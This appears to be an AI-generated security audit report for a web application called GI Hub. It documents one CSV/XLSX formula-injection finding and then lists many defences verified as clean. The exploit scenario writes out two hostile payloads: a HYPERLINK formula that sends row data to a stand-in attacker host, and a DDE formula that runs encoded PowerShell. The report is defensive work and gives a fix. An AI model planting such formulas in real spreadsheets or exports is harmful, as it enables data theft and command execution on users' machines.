# Security & Vulnerability Report — GI Hub

**Date:** 2026-08-05
**Reviewer:** Claude Code (`/security-review`)
**Repo:** `GI_Hub_Project` · branch `main` @ `9c5de7b`
**Scope:** Full codebase audit. Branch `main` has no uncommitted code changes (only `.DS_Store`), so this is a whole-repo review rather than a diff review. 177 Python files, 133 TS/TSX files across `backend/api/`, `frontend/src/`, `legacy/`, `tools/`.

**Result: 1 confirmed finding (Medium). No High-severity issues found.**

---

## Summary

| # | Finding | Severity | Category | Confidence |
|---|---------|----------|----------|------------|
| 1 | CSV/XLSX formula injection in report exports | Medium | `formula_injection` (CWE-1236) | 8/10 |

The application is unusually well-hardened. Authentication, authorization, SQL construction, secrets management, and the AI NL→SQL lane all showed defense-in-depth with the reasoning documented inline. The single finding sits at the *export* boundary — outside the app's own role model, where a low-privileged user's text reaches an approver's spreadsheet client.

---

## Vuln 1: CSV/XLSX Formula Injection

* **Location:** `backend/api/reports.py:442` (`to_csv`), `backend/api/xlsx_style.py:53` (`xl_val`) → `xlsx_style.py:151`
* **Severity:** Medium
* **Category:** `formula_injection` (CWE-1236)
* **Confidence:** 8/10

### Description

`to_csv()` writes database rows straight through `csv.writer` with no neutralization of leading formula characters (`=`, `+`, `-`, `@`, tab, CR).

The XLSX path has the same gap: `xl_val()` (`xlsx_style.py:53-66`) passes `str` values through verbatim to `ws.cell(value=...)` at `xlsx_style.py:151`, and openpyxl infers a leading `=` as a **formula cell** rather than a text cell.

Several exported columns are attacker-writable free text held by the **lowest-privileged role** in the system:

| Column | Exported by | Written by |
|---|---|---|
| `consumption."Remarks"` | `rep_daily_consumption` — `reports.py:184` | `POST /entry/consumption`, `require_roles("store_keeper")` — `entry.py:243` |
| `"FEFO_Override"` → `Override_Reason` | `reports.py:325` | store keeper entry path |
| `po_force_closures.reason` / `notes` | `reports.py:364` | logistics |

All three formats share one pipeline (`render_report`, `reports.py:509`), so the download endpoint, the report archive, and the scheduler are all affected.

### Exploit Scenario

1. A store keeper (role level 0 — the lowest in `ROLE_META`) posts a material issue with:

   ```
   Remarks = =HYPERLINK("https://attacker.tld/x?d="&A1&B1,"Open invoice")
   ```

   or a DDE payload such as `=cmd|'/c powershell -enc <b64>'!A1`.

2. An HOD or admin (level ≥ 2) downloads `GET /reports/daily-consumption?format=csv` — or `format=xlsx`, or retrieves it from the report archive, or receives it from a scheduled run.

3. Excel evaluates the cell on open. The `HYPERLINK` variant exfiltrates neighbouring row data to the attacker on a single click with **no security prompt**. The DDE variant reaches command execution once the user accepts Excel's "enable content" dialog.

**Net effect:** privilege escalation from the lowest role to code execution / data exfiltration on an approver's workstation, bypassing the app's otherwise well-enforced role boundary.

### Recommendation

Neutralize at the render boundary so every report, archive entry, and scheduled export inherits the fix from one change.

In `backend/api/reports.py`:

```python
_RISKY = ("=", "+", "-", "@", "\t", "\r")


def _defuse(v):
    """Prefix a formula-leading string with an apostrophe so Excel/Sheets treat
    it as text. Numbers are untouched — they must keep their spreadsheet type."""
    if isinstance(v, str) and v[:1] in _RISKY:
        return "'" + v
    return v


def to_csv(title, columns, rows, username) -> bytes:
    buf = io.StringIO()
    w = csv.writer(buf, quoting=csv.QUOTE_ALL)
    w.writerow(columns)
    w.writerows([_defuse(c) for c in r] for r in rows)
    return buf.getvalue().encode("utf-8-sig")
```

Apply the same `_defuse` inside `xl_val()` in `backend/api/xlsx_style.py`, before the `isinstance(v, (int, float, str))` passthrough, so `premium_xlsx` / `premium_xlsx_sheets` and every SME workbook layout inherit it.

**Important:** only rewrite `str` values. The numeric branches in `xl_val` must stay untouched — the docstring there explicitly preserves numeric types so cells stay numbers in Excel, and prefixing a number would regress every quantity and valuation column.

Suggested regression test (suite-style, matching `service_tests.py` conventions): post an entry whose `Remarks` starts with `=`, export the consumption report as both `csv` and `xlsx`, and assert the cell reads back as text beginning with `'`.

---

## Verified Clean

Examined specifically and found correctly defended. Recorded so the next audit does not re-tread them.

### Injection & code execution

* **SQL injection — none found.** Every f-string `text()` site was traced: `stock.py:214/218`, `hod.py:276/349/455`, `manhours.py:736`, `sme.py:297`, `console.py:418`, `lining_analytics.py:106`, `entry.py:520/575/873`, `services/procurement.py`, `services/warehouse.py`, `ai/analytics.py`. All interpolate **server-side literals only** — fixed SQL fragments from module-level registries (`DERIVED`, `SQL_SITE_STOCK`) and hardcoded `WHERE` skeletons. Every user-supplied value is a bound parameter.
* **No `pickle`, `yaml.load`, `eval`, or `exec`** anywhere in `backend/`, `tools/`, or `legacy/`.
* **Command injection — none.** The only server-side `subprocess` is `console.py:180` (`pg_dump`): admin-only (`require_level(4)`), argv list, no `shell=True`, credentials passed via `PGPASSWORD` in `env` rather than argv.
* **`legacy/database.py`** contains many f-string DDL statements, but every interpolated value is a module-level constant (table/column names in migration helpers), never request data. That tree is the frozen Streamlit app and is not served by the API.

### Authentication

* Refresh-token rotation (RTR) with token families; replay of a revoked token revokes the **entire family** and audits it (`auth.py:552`).
* Only the SHA-256 hash of legacy refresh tokens is stored; RTR tokens are tracked by `jti`, never stored raw.
* 15-minute access TTL; refresh cookie is `httpOnly`, `Secure` + `SameSite=none` in production.
* Constant-time-ish dummy bcrypt verify on unknown username (`auth.py:468`) closes the user-enumeration timing channel.
* Per-account login throttle **plus** a shared DB-backed budget, so N workers don't mean N × the limit (`auth.py:461-465`).
* `/login/2fa` is throttled on the same per-username budget — the second factor is not the unthrottled step.

### Two-factor authentication

* **Step-up password required to enroll** (`auth.py:779`): a stolen 15-minute access token cannot be converted into durable persistence by binding a new authenticator.
* Per-username TOTP attempt budget (`_check_totp_attempts`) sits *under* the per-IP rate limit, so `CF-Connecting-IP` rotation does not defeat it.
* Phone-change uses **dual OTP** — the old number authorizes, the new number must verify before commit — with per-IP *and* per-number hourly caps against SMS toll fraud.

### Authorization

* Site and warehouse scoping **fail closed**: `''` matches no row rather than acting as a wildcard, and unknown role strings return `''` instead of unrestricted (`auth.py:349-364`).
* Consumption of a resolved scope is funneled through three helpers (`site_filter_applies`, `site_row_visible`, `resolve_site_write`) so `if scope:` truthiness bugs can't reintroduce the leak.
* Auditor read-only is enforced as **method-based ASGI middleware** with an exact-match allowlist (`readonly.py`), not per-endpoint annotations — a newly added `@router.post` is closed by default.
* All 35 routes flagged by an automated "missing auth dependency" scan were manually verified: every one carries a router-level dependency (`require_level(4)` on `console.admin`, `require_level(2)` on `report_center`) or a per-route guard (`_EXEC_READERS`, `_SUPERVISOR`, `_SK`, `_ctx`). The genuinely public routes are exactly `/auth/login`, `/auth/login/2fa`, `/auth/refresh`, `/auth/logout`, `/auth/register`, `/auth/register/sites`, `/webhook`, `/`, `/health` — all appropriate.
* Admin user management blocks self-elevation at registration (`_REGISTERABLE_ROLES` excludes `admin`), guards against demoting the last admin, and revokes all sessions on role/site/warehouse change and on password reset.

### Secrets & crypto

* `jwt_secret()` fails fast in production on a missing, short (<32 char), **or publicly-published** key — including the CI test value, which is explicitly enumerated in `_PUBLISHED_SECRETS`.
* `public_base_url()` refuses to start in production if unset or pointing at localhost.
* `_warn_if_world_readable` warns at load time when `deploy/.env` is more permissive than `0600`.
* bcrypt for passwords and OTP codes; `secrets.token_urlsafe(32)` for weekly-report capability tokens, stored only as a SHA-256 hash.
* No hardcoded live secrets found in tracked files.

### Webhook

* Meta inbound verifies `X-Hub-Signature-256` with `hmac.compare_digest` (`webhook.py:97-98`), backed by a penalty box on repeated mismatch.
* The handshake `hub.verify_token` is also constant-time compared.
* When `WHATSAPP_APP_SECRET` is unset the skip is logged as a warning rather than passing silently.

### Path traversal & file handling

* `documents.py:352` (`/reference/{key}`) and `documents.py:371` (`/master/{entity}`) are allowlist-keyed dicts — no user string reaches a path join.
* Archive downloads resolve `file_path` from a DB row whose on-disk name is a server-generated UUID prefix (`report_center.py:89`).
* `Content-Disposition` filenames come from server-generated report names, not user input.

### Stored XSS via uploads

* Attachment preview renders `image/*` only through `<img src>` — a script-free SVG context — and `application/pdf` only through `<iframe>` (`DocumentLibraryPage.tsx:34-35`).
* nginx sets `X-Content-Type-Options: nosniff` (`deploy/nginx.conf:35`).
* `mtc_documents` accepts any MIME type but has **no serving endpoint**, so there is no path to render it.
* No script-executing path found.

### AI NL→SQL lane

Two independent walls:

1. A pessimistic text gate (`ai/safety.py`) that resolves schema-qualified table references rather than pattern-matching bare names, blocks `pg_catalog`/`information_schema`, blocks niladic introspection functions (`current_user`, `current_database`, …) that carry no parentheses, and enforces row limits.
2. A real PostgreSQL read-only login (`gi_ai_ro`) with `default_transaction_read_only`, a role-level `statement_timeout`, and REVOKEd auth/PII tables.

Gated to level ≥ 3; scoped users are excluded by design because generated SQL can't be reliably site-scoped. Every query is audited with the SQL that actually ran (`ai/router.py:456`).

### Frontend

* Zero `dangerouslySetInnerHTML`, `innerHTML`, or `bypassSecurityTrust*` in `frontend/src/`.
* Access token in `localStorage` is a deliberate trade-off, and with no XSS sink present it is not currently reachable.

### CORS

* Production defaults to an **empty** origin list and must opt in explicitly via `CORS_ORIGINS` (`config.py:102-114`). No wildcard is ever paired with `allow_credentials=True`. The dev-list-leaks-into-production bug (audit A03-F5) is fixed.

---

## Excluded from scope

Per standard security-review policy, the following were not reported even where present: denial-of-service and resource-exhaustion issues, rate-limiting gaps, secrets at rest on disk, outdated third-party dependencies, missing audit logs, absence of hardening measures without a concrete exploit, regex injection/ReDoS, and findings in documentation files.

One hardening observation worth noting outside the findings list: `deploy/nginx.conf` sets `nosniff` and `X-Frame-Options` but no `Content-Security-Policy`. That is defense-in-depth, not an exploitable gap today — no XSS sink was found — but a CSP would cap the blast radius if one were ever introduced.
